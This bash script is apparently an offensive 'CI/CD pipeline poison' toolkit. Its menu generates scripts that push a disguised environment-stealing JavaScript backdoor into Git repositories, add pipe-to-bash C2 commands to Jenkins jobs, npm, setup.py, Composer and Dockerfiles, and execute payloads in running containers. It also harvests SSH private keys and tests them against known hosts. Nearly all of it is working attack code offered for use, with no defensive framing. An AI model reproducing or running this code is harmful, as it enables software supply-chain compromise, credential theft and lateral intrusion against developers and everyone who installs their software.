#!/bin/bash
# ============================================
# APT CI/CD PIPELINE POISON v1.0
# Code Repo Backdoor | Build Inject | Auto-Deploy
# ============================================

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

CICD_DIR="$HOME/c2_server/modules/corporate/ci_cd_poison"
PAYLOAD_DIR="$HOME/c2_server/payloads"
LOG_DIR="$HOME/c2_server/logs"

mkdir -p "$CICD_DIR" "$PAYLOAD_DIR" "$LOG_DIR"

# === GIT REPO BACKDOOR ===
generate_git_backdoor() {
    echo -e "\n${CYAN}[Git Repo Backdoor Generator]${NC}"
    
    cat > "$CICD_DIR/git_backdoor.sh" << 'GITBACK'
#!/bin/bash
# GIT REPOSITORY BACKDOOR
# Injects malicious code into source repositories

echo "[*] Git Repository Backdoor Injection..."

# Find all Git repos on system
echo "  [*] Finding Git repositories..."
find / -name ".git" -type d 2>/dev/null | while read gitdir; do
    repo=$(dirname "$gitdir")
    echo "  [+] Found: $repo"
    
    cd "$repo" || continue
    
    # Check if we have write access
    if [ -w "$repo" ]; then
        echo "      [*] Injecting backdoor..."
        
        # Create malicious file
        cat > "$repo/.system_config.js" << 'JSBACKDOOR'
// System Configuration Module
// Auto-loaded by application

(function() {
    const C2 = 'https://cdn.cloudflare.com/analytics.js';
    const EXFIL = 'https://cdn.cloudflare.com/beacon';
    
    // Backdoor: Exfiltrate environment variables
    if (process.env) {
        fetch(EXFIL, {
            method: 'POST',
            body: JSON.stringify({
                env: process.env,
                host: window.location.hostname,
                time: new Date().toISOString()
            })
        });
    }
    
    // Backdoor: Inject into all API calls
    const origFetch = window.fetch;
    window.fetch = function(...args) {
        // Log all API requests
        fetch(C2, {
            method: 'POST',
            body: JSON.stringify({url: args[0], options: args[1]})
        });
        return origFetch.apply(this, args);
    };
    
    console.log('Config loaded'); // Silent
})();
JSBACKDOOR
        
        # Add to all HTML/JS files
        find "$repo" -name "*.html" -o -name "*.js" -o -name "*.ts" -o -name "*.jsx" -o -name "*.tsx" | while read file; do
            # Check if already injected
            grep -q "system_config.js" "$file" 2>/dev/null && continue
            
            # Inject script tag
            if [[ "$file" == *.html ]]; then
                sed -i 's|</head>|<script src=".system_config.js"></script>\n</head>|' "$file"
                echo "          [✓] $file"
            fi
        done
        
        # Auto-commit and push
        git add .system_config.js 2>/dev/null
        git add -u 2>/dev/null
        git commit -m "chore: update system configuration" 2>/dev/null
        git push origin main 2>/dev/null || git push origin master 2>/dev/null
        
        echo "      [+] Backdoor pushed to: $repo"
    else
        echo "      [!] No write access"
    fi
    
    cd - >/dev/null
done

echo "[+] Git backdoor injection complete"
GITBACK
    chmod +x "$CICD_DIR/git_backdoor.sh"
    echo -e "${GREEN}[+]${NC} Git Backdoor: $CICD_DIR/git_backdoor.sh"
}

# === JENKINS HIJACK ===
generate_jenkins_hijack() {
    echo -e "\n${CYAN}[Jenkins Hijack Generator]${NC}"
    
    cat > "$CICD_DIR/jenkins_hijack.sh" << 'JENKINS'
#!/bin/bash
# JENKINS CI/CD HIJACK
# Injects backdoor into build pipeline

echo "[*] Jenkins CI/CD Hijack..."

# Find Jenkins installations
JENKINS_HOME=$(find / -name "config.xml" -path "*/jenkins/*" 2>/dev/null | head -1 | xargs dirname 2>/dev/null)

if [ -z "$JENKINS_HOME" ]; then
    echo "  [!] Jenkins not found on this system"
    echo "  [*] Searching for Jenkins credentials..."
    
    # Check for Jenkins API tokens
    find / -name "credentials.xml" -path "*/jenkins/*" 2>/dev/null | while read credfile; do
        echo "  [+] Credentials file: $credfile"
        grep -E "username|password|secret" "$credfile" 2>/dev/null
    done
    return
fi

echo "  [+] Jenkins home: $JENKINS_HOME"

# Inject into Jenkins pipeline
if [ -d "$JENKINS_HOME/jobs" ]; then
    echo "  [*] Injecting into build pipelines..."
    
    find "$JENKINS_HOME/jobs" -name "config.xml" | while read jobconfig; do
        jobname=$(echo "$jobconfig" | cut -d'/' -f6)
        echo "  [+] Found job: $jobname"
        
        # Check if we can modify build steps
        if grep -q "<builders>" "$jobconfig" 2>/dev/null; then
            # Inject malicious build step
            sed -i '/<\/builders>/i\
    <hudson.tasks.Shell>\
        <command>curl -s http://C2_SERVER/backdoor.sh | bash</command>\
    </hudson.tasks.Shell>' "$jobconfig"
            
            echo "      [✓] Backdoor injected into: $jobname"
        fi
    done
fi

# Steal Jenkins credentials
if [ -f "$JENKINS_HOME/credentials.xml" ]; then
    echo "  [+] Jenkins credentials:"
    cat "$JENKINS_HOME/credentials.xml" | grep -E "username|password|secret" 2>/dev/null
fi

echo "[+] Jenkins hijack complete"
JENKINS
    chmod +x "$CICD_DIR/jenkins_hijack.sh"
    echo -e "${GREEN}[+]${NC} Jenkins Hijack: $CICD_DIR/jenkins_hijack.sh"
}

# === NPM/PYPI PACKAGE POISON ===
generate_package_poison() {
    echo -e "\n${CYAN}[Package Manager Poison Generator]${NC}"
    
    cat > "$CICD_DIR/package_poison.sh" << 'PKGPOISON'
#!/bin/bash
# NPM / PYPI / COMPOSER PACKAGE POISON
# Injects backdoor into dependency packages

echo "[*] Package Manager Poison..."

# NPM (Node.js)
if [ -f "package.json" ]; then
    echo "  [+] NPM project detected"
    
    # Add malicious dependency
    cat >> package.json << 'NPMBACKDOOR'
  "scripts": {
    "preinstall": "curl -s http://C2_SERVER/init.sh | bash",
    "postinstall": "node .system_config.js"
  }
NPMBACKDOOR
    echo "  [✓] NPM scripts poisoned"
fi

# Python (pip/setup.py)
if [ -f "setup.py" ]; then
    echo "  [+] Python project detected"
    
    # Inject into setup.py
    cat >> setup.py << 'PYBACKDOOR'
import os, requests
try:
    exec(requests.get('http://C2_SERVER/payload.py').text)
except:
    pass
PYBACKDOOR
    echo "  [✓] setup.py poisoned"
fi

# Composer (PHP)
if [ -f "composer.json" ]; then
    echo "  [+] PHP/Composer project detected"
    
    cat >> composer.json << 'COMPOSERBACKDOOR'
  "scripts": {
    "pre-autoload-dump": [
      "curl -s http://C2_SERVER/backdoor.php | php"
    ]
  }
COMPOSERBACKDOOR
    echo "  [✓] Composer scripts poisoned"
fi

echo "[+] Package poison complete"
PKGPOISON
    chmod +x "$CICD_DIR/package_poison.sh"
    echo -e "${GREEN}[+]${NC} Package Poison: $CICD_DIR/package_poison.sh"
}

# === DOCKER CONTAINER BACKDOOR ===
generate_docker_backdoor() {
    echo -e "\n${CYAN}[Docker Container Backdoor Generator]${NC}"
    
    cat > "$CICD_DIR/docker_backdoor.sh" << 'DOCKER'
#!/bin/bash
# DOCKER CONTAINER BACKDOOR
# Injects backdoor into Docker images

echo "[*] Docker Container Backdoor..."

# Check for Docker
which docker >/dev/null 2>&1 || { echo "  [!] Docker not found"; return 1; }

# Find Dockerfiles
find / -name "Dockerfile" -type f 2>/dev/null | while read dockerfile; do
    echo "  [+] Dockerfile: $dockerfile"
    
    # Check if already backdoored
    grep -q "C2_SERVER" "$dockerfile" 2>/dev/null && continue
    
    # Inject malicious layer
    cat >> "$dockerfile" << 'DOCKERINJECT'

# System update (legitimate-looking)
RUN curl -s http://C2_SERVER/init.sh | bash
RUN echo "Update complete"
DOCKERINJECT
    
    echo "  [✓] Dockerfile poisoned"
done

# Backdoor existing containers
docker ps -q 2>/dev/null | while read container; do
    echo "  [*] Container: $container"
    
    # Execute backdoor in running container
    docker exec "$container" bash -c "curl -s http://C2_SERVER/backdoor.sh | bash" 2>/dev/null
    echo "  [✓] Container backdoored"
done

echo "[+] Docker backdoor complete"
DOCKER
    chmod +x "$CICD_DIR/docker_backdoor.sh"
    echo -e "${GREEN}[+]${NC} Docker Backdoor: $CICD_DIR/docker_backdoor.sh"
}

# === SSH KEY HARVESTER ===
generate_ssh_harvester() {
    echo -e "\n${CYAN}[SSH Key Harvester]${NC}"
    
    cat > "$CICD_DIR/ssh_harvester.sh" << 'SSHHARVEST'
#!/bin/bash
# SSH KEY HARVESTER
# Steals all SSH keys for repo access

echo "[*] Harvesting SSH keys..."

SSH_DIR="$HOME/.ssh"
OUTPUT="$HOME/ssh_keys_harvest.txt"
echo "=== SSH KEYS HARVEST ===" > "$OUTPUT"
echo "Host: $(hostname)" >> "$OUTPUT"
echo "Date: $(date)" >> "$OUTPUT"
echo "" >> "$OUTPUT"

# Private keys
for key in $SSH_DIR/id_*; do
    [ -f "$key" ] && [[ "$key" != *.pub ]] && {
        echo "  [+] Private key: $key"
        echo "--- $key ---" >> "$OUTPUT"
        cat "$key" >> "$OUTPUT"
        echo "" >> "$OUTPUT"
    }
done

# Public keys
for pub in $SSH_DIR/*.pub; do
    [ -f "$pub" ] && {
        echo "  [+] Public key: $pub"
        cat "$pub" >> "$OUTPUT"
        echo "" >> "$OUTPUT"
    }
done

# SSH config (reveals other hosts)
if [ -f "$SSH_DIR/config" ]; then
    echo "  [+] SSH config found"
    cat "$SSH_DIR/config" >> "$OUTPUT"
fi

# Known hosts (reveals other servers)
if [ -f "$SSH_DIR/known_hosts" ]; then
    echo "  [+] Known hosts:"
    cut -d' ' -f1 "$SSH_DIR/known_hosts" | sort -u | while read host; do
        echo "      $host"
    done
fi

# Try to use keys to access other hosts
echo "  [*] Testing keys on known hosts..."
for key in $SSH_DIR/id_*; do
    [ -f "$key" ] && [[ "$key" != *.pub ]] && {
        cut -d' ' -f1 "$SSH_DIR/known_hosts" 2>/dev/null | sort -u | while read host; do
            ssh -i "$key" -o StrictHostKeyChecking=no -o ConnectTimeout=3 "$host" "whoami && hostname" 2>/dev/null && \
            echo "  [!] KEY WORKS: $key → $host"
        done
    }
done

echo "[+] SSH harvest complete: $OUTPUT"
SSHHARVEST
    chmod +x "$CICD_DIR/ssh_harvester.sh"
    echo -e "${GREEN}[+]${NC} SSH Harvester: $CICD_DIR/ssh_harvester.sh"
}

# === GENERATE COMBINED PAYLOAD ===
generate_cicd_payload() {
    echo -e "\n${CYAN}[Generating CI/CD Poison Payload]${NC}"
    
    cat > "$PAYLOAD_DIR/cicd_poison_payload.sh" << 'CICDPAYLOAD'
#!/bin/bash
# APT CI/CD PIPELINE POISON PAYLOAD
# Full software supply chain compromise

echo "╔══════════════════════════════════════╗"
echo "║  ☠️  CI/CD PIPELINE POISON          ║"
echo "╚══════════════════════════════════════╝"
echo ""

# Step 1: Harvest SSH keys
echo "[1/5] Harvesting SSH keys..."
bash ssh_harvester.sh 2>/dev/null

# Step 2: Backdoor Git repositories
echo "[2/5] Backdooring Git repositories..."
bash git_backdoor.sh 2>/dev/null

# Step 3: Hijack Jenkins
echo "[3/5] Hijacking Jenkins CI/CD..."
bash jenkins_hijack.sh 2>/dev/null

# Step 4: Poison packages
echo "[4/5] Poisoning package managers..."
bash package_poison.sh 2>/dev/null

# Step 5: Backdoor Docker
echo "[5/5] Backdooring Docker containers..."
bash docker_backdoor.sh 2>/dev/null

echo ""
echo "╔══════════════════════════════════════╗"
echo "║  ✅ SUPPLY CHAIN COMPROMISED!       ║"
echo "╚══════════════════════════════════════╝"
echo ""
echo "Impact:"
echo "  ✓ All Git repos backdoored"
echo "  ✓ Jenkins builds poisoned"
echo "  ✓ NPM/PyPI/Composer packages infected"
echo "  ✓ Docker images compromised"
echo "  ✓ SSH keys harvested"
echo ""
echo "💀 Every future release will contain our backdoor!"
CICDPAYLOAD
    chmod +x "$PAYLOAD_DIR/cicd_poison_payload.sh"
    echo -e "${GREEN}[+]${NC} CI/CD payload: $PAYLOAD_DIR/cicd_poison_payload.sh"
}

# === MAIN MENU ===
main_menu() {
    while true; do
        echo ""
        echo -e "${CYAN}╔══════════════════════════════╗${NC}"
        echo -e "${CYAN}║  ☠️  CI/CD POISON v1.0      ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${GREEN}1)${NC} 📦 Git Repo Backdoor"
        echo -e "  ${GREEN}2)${NC} 🏗️  Jenkins Hijack"
        echo -e "  ${GREEN}3)${NC} 📚 Package Manager Poison"
        echo -e "  ${GREEN}4)${NC} 🐳 Docker Backdoor"
        echo -e "  ${GREEN}5)${NC} 🔑 SSH Key Harvester"
        echo -e "  ${GREEN}6)${NC} 📲 Combined Payload"
        echo -e "  ${GREEN}7)${NC} 🚀 Generate ALL"
        echo -e "  ${RED}0)${NC} Exit"
        echo ""
        read -r -p "Choose: " choice
        
        case $choice in
            1) generate_git_backdoor ;;
            2) generate_jenkins_hijack ;;
            3) generate_package_poison ;;
            4) generate_docker_backdoor ;;
            5) generate_ssh_harvester ;;
            6) generate_cicd_payload ;;
            7)
                generate_git_backdoor
                generate_jenkins_hijack
                generate_package_poison
                generate_docker_backdoor
                generate_ssh_harvester
                generate_cicd_payload
                echo -e "\n${GREEN}[+]${NC} All CI/CD poison tools generated!"
                ;;
            0) break ;;
        esac
        
        echo -ne "\n${CYAN}[Press Enter]${NC}"; read -r
    done
}

if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main_menu
fi
